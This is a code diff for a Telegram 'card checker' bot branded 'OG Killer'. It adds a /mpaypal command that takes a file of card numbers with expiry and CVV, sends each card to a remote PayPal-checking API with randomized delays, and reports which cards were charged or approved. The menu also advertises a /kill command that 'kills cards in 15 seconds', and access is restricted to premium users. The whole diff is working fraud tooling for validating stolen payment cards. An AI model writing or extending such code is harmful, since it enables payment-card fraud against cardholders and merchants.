@@ -300,7 +300,7 @@ async def paypal_single(card: CardRequest):
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.get("/paypal_mass")
-async def check_batch(cards: list[CardRequest]):
+async def paypal_check_batch(cards: list[CardRequest]):
     """Check multiple cards - queued to process without overlapping"""
     results = []
     
@@ -940,25 +940,16 @@ async def test_proxy(proxy):
 async def start(event):
     await event.reply(
         premium_emoji(
-            "<b>⚡💳 Welcome to Shopiiiii ! 💳⚡</b>\n"
+            "<b>⚡💳 Welcome to OG Killer ! 💳⚡</b>\n"
             "<b>━━━━━━━━━━━━━━━━━</b>\n"
             "<b>⚡💠 𝐂𝐂 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
-            "<blockquote>• /cc card|mm|yy|cvv - Check single CC\n"
-            "• /chk - Reply to .txt file to check cards</blockquote>\n"
-            " /kill - kill a cc within 15 seconds \n"
-            "<b>⚡💠 𝐒𝐢𝐭𝐞 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
-            "<blockquote>• /site - Check all sites & remove dead\n"
-            "• /rm url - Remove a specific site</blockquote>\n"
-            "<b>⚡💠 𝐏𝐫𝐨𝐱𝐲 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
-            "<blockquote>• /proxy - Check all proxies & remove dead\n"
-            "• /addproxy - Add proxies (one per line)\n"
-            "• /chkproxy proxy - Check single proxy\n"
-            "• /rmproxy proxy - Remove single proxy\n"
-            "• /rmproxyindex 1,2,3 - Remove by index\n"
-            "• /clearproxy - Remove all proxies\n"
-            "• /getproxy - Get all proxies</blockquote>\n"
-            "<b>━━━━━━━━━━━━━━━━━</b>\n"
-            "<b>⚠️ Only premium users can use this bot.</b>"
+            "<blockquote>• /paypal card|mm|yy|cvv - Check single CC\n"
+            "• /mpaypal - Reply to .txt file to check cards</blockquote>\n"
+
+            "<b>⚡💠 Killer </b>\n"
+            "<blockquote>• /kill card|mm|yy|cvv \n"
+            "Kills cards in 15 seconds </blockquote>\n"
+            
         ),
         parse_mode='html'
     )
@@ -1733,10 +1724,202 @@ async def paypal(event):
 
 
 
-@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
-async def single_cc_check(event):
-    """Check a single CC"""
+@bot.on(events.NewMessage(pattern=r'/mpaypal'))
+async def mpaypal(event):
+
+    active_session = []
+
     user_id = event.sender_id
+
+    active_session.append(user_id)
+
+    if not user_id in KILLER_ALLOWED_USERS:
+        
+        await event.reply(premium_emoji(f"❌ Needs access from Admin"), parse_mode='html')
+        return
+    
+    # Check if replying to a file
+    if not event.is_reply:
+        await event.reply(premium_emoji("❌ <b>Invalid Usage</b>\n\nReply to a .txt file with cards (one per line)\n<code>card|mm|yy|cvv</code>"), parse_mode='html')
+        return
+    
+    replied_msg = await event.get_reply_message()
+    
+    # Check if message has a document/file
+    if not replied_msg.document:
+        await event.reply(premium_emoji("❌ <b>No File Found</b>\n\nReply to a text file containing cards"), parse_mode='html')
+        return
+    
+    # Download file
+    try:
+        file_path = await bot.download_media(replied_msg, file=f"/tmp/cards_{user_id}.txt")
+    except Exception as e:
+        await event.reply(premium_emoji(f"❌ Error downloading file: {e}"), parse_mode='html')
+        return
+    
+    # Read cards from file
+    try:
+        with open(file_path, 'r') as f:
+            lines = f.readlines()
+        
+        cards = []
+        for line in lines:
+            line = line.strip()
+            if line and '|' in line:
+                parts = line.split('|')
+                if len(parts) >= 4:
+                    cards.append({
+                        'num': parts[0].strip(),
+                        'mon': parts[1].strip(),
+                        'yer': parts[2].strip(),
+                        'cvc': parts[3].strip()
+                    })
+        
+        if not cards:
+            await event.reply(premium_emoji("❌ <b>No Valid Cards Found</b>\n\nFormat: <code>card|mm|yy|cvv</code>"), parse_mode='html')
+            return
+            
+    except Exception as e:
+        await event.reply(premium_emoji(f"❌ Error reading file: {e}"), parse_mode='html')
+        return
+    
+    # Send initial status
+    status_msg = await event.reply(
+        premium_emoji(
+            f"<b>⚡💳 ㅤ#PayPal MASS CHECK  💳⚡</b>\n"
+            f"<b>━━━━━━━━━━━━━━━━━</b>\n"
+            f"<b>📊 Total Cards: {len(cards)}</b>\n"
+            f"<b>⚡💠 Checking...</b>\n"
+            f"<b>━━━━━━━━━━━━━━━━━</b>"
+        ),
+        parse_mode='html'
+    )
+    
+    PAYPAL_API = 'https://strong-production.up.railway.app/paypal'
+    
+    results = {
+        'CHARGED': [],
+        'APPROVED': [],
+        'DECLINED': [],
+        'ERROR': [],
+        'OTHER': []
+    }
+    
+    checked = 0
+    
+    # Check each card
+    for card_data in cards:
+        try:
+            # Rate limit
+            await asyncio.sleep(random.randint(6, 10))
+            
+            num = card_data['num']
+            mm = card_data['mon']
+            yy = card_data['yer']
+            cvv = card_data['cvc']
+            
+            bin_num = num[:6]
+            card_display = f"{num}|{mm}|{yy}|{cvv}"
+            
+            # Make API request
+            result = session.get(PAYPAL_API, json={'num': num, 'mon': mm, 'yer': yy, 'cvc': cvv}, timeout=40).json()
+            
+            print(f'response: {result}')
+            
+            message = result.get('message', 'UNKNOWN')
+            
+            # Categorize result
+            if 'CHARGED' in message:
+                results['CHARGED'].append({
+                    'card': card_display,
+                    'status': message,
+                    'bin': bin_num
+                })
+            elif 'APPROVED' in message or 'ACCEPTED' in message:
+                results['APPROVED'].append({
+                    'card': card_display,
+                    'status': message,
+                    'bin': bin_num
+                })
+            elif 'DECLINE' in message or 'DECLINED' in message:
+                results['DECLINED'].append({
+                    'card': card_display,
+                    'status': message,
+                    'bin': bin_num
+                })
+            else:
+                results['OTHER'].append({
+                    'card': card_display,
+                    'status': message,
+                    'bin': bin_num
+                })
+            
+            checked += 1
+            
+            # Update progress every 5 cards
+            if checked % 5 == 0:
+                await status_msg.edit(
+                    premium_emoji(
+                        f"<b>⚡💳 ㅤ#PayPal MASS CHECK  💳⚡</b>\n"
+                        f"<b>━━━━━━━━━━━━━━━━━</b>\n"
+                        f"<b>📊 Total Cards: {len(cards)}</b>\n"
+                        f"<b>⚡💠 Progress: {checked}/{len(cards)}</b>\n"
+                        f"<b>━━━━━━━━━━━━━━━━━</b>"
+                    ),
+                    parse_mode='html'
+                )
+        
+        except Exception as e:
+            print(f"Error checking card: {e}")
+            results['ERROR'].append({
+                'card': card_display,
+                'status': str(e),
+                'bin': bin_num
+            })
+            checked += 1
+    
+    # Generate final report
+    report = f"""<b>⚡💳 ㅤ#PayPal MASS CHECK RESULTS  💳⚡</b>
+<b>━━━━━━━━━━━━━━━━━</b>
+
+<b>📊 Statistics:</b>
+✅ Charged: {len(results['CHARGED'])}
+🔥 Approved: {len(results['APPROVED'])}
+❌ Declined: {len(results['DECLINED'])}
+⚠️ Other: {len(results['OTHER'])}
+💥 Errors: {len(results['ERROR'])}
+
+<b>Total Checked: {checked}/{len(cards)}</b>
+<b>━━━━━━━━━━━━━━━━━</b>
+"""
+    
+    # Add charged cards
+    if results['CHARGED']:
+        report += "\n<b>✅ CHARGED:</b>\n"
+        for item in results['CHARGED'][:10]:  # Limit to 10
+            report += f"  {item['card']} - {item['status']}\n"
+        if len(results['CHARGED']) > 10:
+            report += f"  ... and {len(results['CHARGED']) - 10} more\n"
+    
+    # Add approved cards
+    if results['APPROVED']:
+        report += "\n<b>🔥 APPROVED:</b>\n"
+        for item in results['APPROVED'][:10]:
+            report += f"  {item['card']} - {item['status']}\n"
+        if len(results['APPROVED']) > 10:
+            report += f"  ... and {len(results['APPROVED']) - 10} more\n"
+    
+    report += "\n<b>━━━━━━━━━━━━━━━━━</b>\n"
+    report += "🤖 <b>Bot By: @technopile</b>"
+    
+    await status_msg.edit(premium_emoji(report), parse_mode='html')
+    
+    # Clean up
+    import os
+    try:
+        os.remove(file_path)
+    except:
+        pass
 
     try:
         sender = await event.get_sender()
